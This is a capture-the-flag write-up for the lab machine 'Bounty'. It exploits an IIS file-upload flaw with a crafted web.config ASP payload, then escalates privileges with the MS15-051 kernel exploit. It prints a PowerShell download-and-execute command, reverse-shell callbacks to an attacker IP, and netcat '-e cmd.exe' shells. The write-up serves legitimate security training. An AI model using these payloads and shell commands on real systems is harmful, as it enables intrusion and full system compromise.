# Bounty
## Information Gathering
10.10.10.93

### On the Fly
- tcp_80_http_feroxbuster_dirbuster.txt has two interesting endpoints
	- /transfer.aspx - upload files
	- /uploadedfiles/ - ping files
	- Only certain file extensions are acceptable
		- doc, docx, xls, xlsx, config
- Microsoft IIS httpd 7.5 implies OS is Winows Server 2008 R2 or Windows 7


#### Ports/Services
- 80/tcp http Microsoft IIS httpd 7.5

## Enumeration
#### Nmap scan
```bash
PORT   STATE SERVICE REASON          VERSION
80/tcp open  http    syn-ack ttl 127 Microsoft IIS httpd 7.5
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: Bounty
|_http-server-header: Microsoft-IIS/7.5
```
## Exploitation
This is a basic file-upload vulnerability. First, determine which extensions are acceptable. I used Burp Intruder to fuzz which extensions are allowed. Allowed extensions from my results were: .doc, .docx, .xls, .xlsx, .config

The .config is really the only extension that permits code execution. [This](https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/) is a good read to learn about the exploit and [this](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config/web.config) webshell was recommended as the payload. I never got the webshell working but I had a hunch that code execution was still possible.

I used [this](https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmdasp.asp) webshell as my template.
I removeded all the aspects that made this script a webshell and hardcoded the commands I wanted to execute. This was my final version:
```as
<%@ Language=VBScript %>
<%

  Dim oScript
  Dim oFileSys
  Dim szCMD, szTempFile

  On Error Resume Next

  Set oScript = Server.CreateObject("WSCRIPT.SHELL")
  Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")

  szCMD = Request.Form(".CMD")

 Call oScript.Run ("cmd.exe /c ping 10.10.14.14")

%>
```
Always test your payload first by simply pinging your machine. 

I then replaced `cmd.exe /c ping 10.10.14.14` with `cmd.exe /c powershell iex(new-object web.netclient).downloadstring('http://10.10.14.14/shell.ps1')`

The AV looks like this:
1. Start a web server hosting your reverse shell script. I use Invoke-PowerShellTcp.ps1 just don't forget to add `Invoke-PowerShellTcp -Reverse -IPAddress 10.10.10.10 -Port 53` at the end of your script
2. Spin up a listener `nc -lnvp 53`
3. Upload the web.config file with your ASP code and fetch http://10.10.10.93/uploadedfiles/web.config

You should catch a reverse shell as bounty\\merlin

To get the user flag you have to use:
```powershell
gci -force
```
To show hidden files

## Privilege Escalation
Check out the systeminfo
```powershell
Host Name:                 BOUNTY
OS Name:                   Microsoft Windows Server 2008 R2 Datacenter 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                55041-402-3606965-84760
Original Install Date:     5/30/2018, 12:22:24 AM
System Boot Time:          5/20/2022, 10:43:58 PM
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: Intel64 Family 6 Model 85 Stepping 7 GenuineIntel ~2294 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     2,047 MB
Available Physical Memory: 1,472 MB
Virtual Memory: Max Size:  4,095 MB
Virtual Memory: Available: 3,483 MB
Virtual Memory: In Use:    612 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Network Connection
                                 Connection Name: Local Area Connection
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.93
```

First looking at OS Version shows N/A implying that there are no service packs installed on this client. Another point of interest is that hotfixes are N/A as well. This means that this client is likely vulnerable to a kernel exploit. 

Taking a look at C:\Windows\SoftwareDistribution\Downlod, this is where updates are downloaded and staged for installation. This directory is empty implying that this machine has never been updated and/or that this machine hasn't been updated in a while.

I use [MS15-051](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS15-051) kernel exploit to gain System. Transfer ms15-051x64.exe file and nc.exe over to the target machine. You can do this either through powershell or by using impacket-smbserver.

Start up a reverse shell `nc -lnvp 1337` and run the executable:
```powershell
.\ms15-051x64.exe "nc.exe -nv 10.10.14.14 1337 -e cmd.exe"
```

You should catch a reverse shell as NT Authority\\System